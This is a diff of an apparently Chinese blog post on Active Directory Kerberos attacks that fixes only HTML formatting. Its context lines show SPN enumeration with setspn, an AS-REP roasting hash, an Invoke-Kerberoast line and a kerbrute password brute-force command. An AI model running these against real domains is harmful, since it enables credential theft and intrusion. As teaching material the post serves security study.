@@ -181,7 +181,7 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:59726561a02eb64b0a108c63f1078db3$7866b1d
 <pre class="line-numbers language-none"><code class="language-none">setspn -Q *&#x2F;*    #查看当前域内的所有SPN
 setspn -T delay.com -Q *&#x2F;*  #查看delay.com域内的SPN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p>其中格式：&lt;服务类型&gt;/&lt;机器名&gt;:&lt;端口&gt;</p>
+<p>其中格式：&lt;服务类型&gt;&#x2F;&lt;机器名&gt;:&lt;端口&gt;</p>
 <pre class="line-numbers language-none"><code class="language-none">CN&#x3D;DC,OU&#x3D;Domain Controllers,DC&#x3D;de1ay,DC&#x3D;com
 	Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04&#x2F;DC.de1ay.com
     ldap&#x2F;DC.de1ay.com&#x2F;ForestDnsZones.de1ay.com
@@ -253,9 +253,9 @@ Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CS
 
 <h3 id="Bruteforcing"><a href="#Bruteforcing" class="headerlink" title="Bruteforcing"></a>Bruteforcing</h3><p>暴力破解枚举账号和密码，可以执行的操作有</p>
 <ul>
-<li>  枚举有效的用户名</li>
-<li>  枚举用户名和密码</li>
-<li>  查找没有启动预先身份验证的用户</li>
+<li>枚举有效的用户名</li>
+<li>枚举用户名和密码</li>
+<li>查找没有启动预先身份验证的用户</li>
 </ul>
 <p>利用项目：<a target="_blank" rel="noopener" href="https://github.com/TarlogicSecurity/kerbrute">https://github.com/TarlogicSecurity/kerbrute</a></p>
 <pre class="line-numbers language-none"><code class="language-none">.&#x2F;kerbrute.py -users users_file.txt -passwords passwords_file.txt -domain contoso.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
